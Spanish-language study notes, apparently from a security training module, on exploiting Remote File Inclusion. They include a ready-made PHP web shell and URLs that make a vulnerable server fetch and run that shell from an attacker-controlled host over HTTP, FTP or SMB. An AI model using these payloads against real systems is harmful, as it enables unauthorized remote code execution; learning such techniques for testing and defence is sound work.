
## 1. ¿Qué es RFI?

**Remote File Inclusion (RFI)** es una vulnerabilidad que permite incluir archivos alojados en un servidor remoto mediante una función vulnerable de una aplicación web.

Puede permitir dos tipos principales de explotación:

- **SSRF:** acceder a servicios y aplicaciones internas del servidor vulnerable mediante solicitudes realizadas desde el propio servidor.
    
- **RCE:** ejecutar código en el servidor vulnerable al incluir un script malicioso alojado en una máquina controlada por el atacante.
    

La explotación depende de la función vulnerable, el lenguaje de programación y la configuración del servidor.

---

## 2. Diferencias entre LFI y RFI

|Característica|LFI|RFI|
|---|---|---|
|Nombre|Local File Inclusion|Remote File Inclusion|
|Origen del archivo|Sistema de archivos local|Servidor remoto|
|Lectura de archivos|Sí, dependiendo de la vulnerabilidad|Sí, si la función permite acceder al recurso|
|Ejecución de código|Posible en determinados escenarios|Posible si el archivo remoto se interpreta como código|
|SSRF|Puede ser posible mediante determinados comportamientos|Puede permitir acceder a servicios internos|

### Funciones vulnerables

Según la tabla del módulo:

|Lenguaje|Función|Leer contenido|Ejecutar código|URL remota|
|---|---|---|---|---|
|PHP|`include()` / `include_once()`|Sí|Sí|Sí|
|PHP|`file_get_contents()`|Sí|No|Sí|
|Java|`import`|Sí|Sí|Sí|
|.NET|`@Html.RemotePartial()`|Sí|No|Sí|
|.NET|`include`|Sí|Sí|Sí|

**Importante:** una RFI no siempre permite ejecutar código. Algunas funciones solo leen contenido, aunque pueden resultar útiles para realizar SSRF.

Una LFI tampoco implica necesariamente que exista RFI, por ejemplo, si la aplicación bloquea las URL remotas o solo permite controlar una parte de la ruta.

## 3. Comprobar si RFI es posible

En PHP, la configuración `allow_url_include` es relevante para la inclusión de archivos remotos.

Podemos comprobarla leyendo el archivo `php.ini` mediante la LFI y decodificando su contenido si es necesario.

```
echo 'CADENA_BASE64' | base64 -d | grep allow_url_include
```

Si aparece:

```
allow_url_include = On
```

La configuración permite investigar este tipo de inclusión.

Sin embargo, esto **no garantiza que la función vulnerable acepte URL remotas**. Es necesario comprobar el comportamiento real de la aplicación.

### Prueba con una URL local

El módulo propone intentar incluir la propia aplicación a través de `127.0.0.1`:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

Si el contenido de `index.php` aparece dentro de la sección vulnerable, puede indicar que la aplicación permite incluir recursos mediante URL.

Si el contenido se ejecuta y se renderiza como PHP, también indica que el recurso incluido se está interpretando como código.

### Precaución

Incluir repetidamente la propia página vulnerable puede provocar inclusiones recursivas y causar una denegación de servicio (DoS).

# 4. Conseguir RCE mediante RFI

Una técnica consiste en crear un archivo PHP, alojarlo en una máquina controlada por nosotros e intentar incluirlo desde la aplicación vulnerable.

## 4.1. Crear una web shell

El módulo utiliza el siguiente archivo `shell.php`:

```
<?php system($_GET["cmd"]); ?>
```

Podemos crearlo con:

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

El código permite ejecutar el comando indicado en el parámetro `cmd` cuando el archivo se interpreta como PHP.

---

## 5. Método HTTP

Podemos utilizar un servidor HTTP básico de Python para alojar el archivo:

```
sudo python3 -m http.server <LISTENING_PORT>
```

El servidor quedará escuchando en el puerto indicado.

Después, desde la aplicación vulnerable, se intenta incluir el archivo remoto:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

Si la inclusión y la ejecución funcionan, el servidor vulnerable solicitará `shell.php` a nuestra máquina y ejecutará el código incluido.

Una posible respuesta sería:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto indica que el comando se ejecutó con los privilegios del usuario `www-data`.

### Comprobar las peticiones recibidas

En la terminal donde ejecutamos el servidor HTTP podemos observar las solicitudes entrantes.

Por ejemplo:

```
"GET /shell.php HTTP/1.0" 200 -
```

Esto confirma que el servidor remoto solicitó el archivo, aunque por sí solo no garantiza que el código se haya ejecutado correctamente.

**Consejo del módulo:** comprueba qué ruta solicita el servidor. Si la aplicación añade automáticamente una extensión como `.php`, puede ser necesario adaptar la ruta utilizada.

---

## 6. Método FTP

Si el protocolo HTTP está bloqueado o la aplicación filtra determinadas cadenas, el módulo propone utilizar FTP.

### Iniciar un servidor FTP

Primero, instala `pyftpdlib` si no está disponible y ejecuta:

```
sudo python -m pyftpdlib -p 21
```

El servidor FTP quedará escuchando en el puerto 21.

### Intentar incluir el archivo remoto

La estructura de la URL utiliza el esquema `ftp://`:

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

Si el servidor FTP requiere autenticación, las credenciales pueden formar parte de la URL:

```
ftp://user:pass@<OUR_IP>/shell.php
```

El módulo señala que PHP suele intentar autenticarse como usuario anónimo por defecto, aunque el comportamiento depende de la configuración y del servidor FTP.

### ¿Cuándo puede resultar útil?

- Cuando las conexiones HTTP salientes están bloqueadas.
    
- Cuando la cadena `http://` está filtrada.
    
- Cuando el servidor permite obtener archivos mediante FTP.

## 7. Método SMB

En determinadas aplicaciones alojadas en Windows, se puede intentar incluir un archivo remoto mediante SMB.

Windows permite acceder a archivos compartidos utilizando rutas UNC, por ejemplo:

```
\\<OUR_IP>\share\shell.php
```

El módulo explica que esta técnica puede permitir RFI sin depender de `allow_url_include`, ya que Windows puede tratar los archivos de un recurso SMB remoto como archivos accesibles mediante una ruta.

### Iniciar un servidor SMB

Utilizando Impacket:

```
impacket-smbserver -smb2support share "$(pwd)"
```

Esto comparte el directorio de trabajo actual con el nombre `share`.

### Intentar la inclusión remota

El ejemplo del módulo utiliza:

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

Si funciona, la salida del comando podría identificar la cuenta bajo la que se ejecuta la aplicación.

Por ejemplo:

```
NT AUTHORITY\IUSR
```

### Limitaciones

- Es especialmente relevante en servidores Windows.
    
- La máquina vulnerable debe poder acceder al recurso SMB.
    
- El tráfico SMB puede estar bloqueado, especialmente entre redes diferentes o a través de Internet.
    
- La inclusión y ejecución siguen dependiendo del comportamiento de la aplicación vulnerable.

# 8. Comparativa de los métodos RFI

|Método|Servidor utilizado|Esquema o ruta|Situación de uso|
|---|---|---|---|
|HTTP|`python3 -m http.server`|`http://`|Cuando se permiten conexiones HTTP desde el servidor vulnerable.|
|FTP|`pyftpdlib`|`ftp://`|Cuando FTP está disponible y HTTP no resulta viable.|
|SMB|`impacket-smbserver`|Ruta UNC `\\HOST\share\archivo`|Principalmente en servidores Windows con acceso al recurso SMB.|

# 10. Chuleta para el examen

### Diferencias importantes

- **LFI:** inclusión de archivos locales.
    
- **RFI:** inclusión de archivos remotos.
    
- **SSRF:** permite utilizar al servidor vulnerable para realizar solicitudes a otros recursos.
    
- **RCE:** ejecución de código o comandos en el sistema objetivo.
    

### Configuración de PHP

```
allow_url_include = On
```

Su valor debe comprobarse, pero no demuestra por sí solo que exista RFI.

### Crear una web shell de prueba

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Servidor HTTP

```
sudo python3 -m http.server <LISTENING_PORT>
```

### Servidor FTP

```
sudo python -m pyftpdlib -p 21
```

### Servidor SMB

```
impacket-smbserver -smb2support share "$(pwd)"
```

### Ideas clave

1. Una LFI no siempre permite RFI.
    
2. Una RFI no siempre permite RCE: depende de si la función ejecuta el contenido incluido.
    
3. `allow_url_include` es relevante para la inclusión remota en PHP, pero no es una comprobación suficiente por sí sola.
    
4. HTTP, FTP y SMB son alternativas para alojar archivos remotos, dependiendo de las capacidades y restricciones del objetivo.
    
5. La salida de un comando permite comprobar qué usuario ejecuta el código.
    
6. La lectura de archivos de configuración y credenciales también puede ofrecer vías de acceso al servidor sin necesidad de explotar RCE directamente.
    

**Idea clave:** para transformar una vulnerabilidad LFI en RFI, primero debes comprobar si la aplicación permite incluir recursos remotos. Si además ejecuta el código incluido, la vulnerabilidad puede permitir RCE.
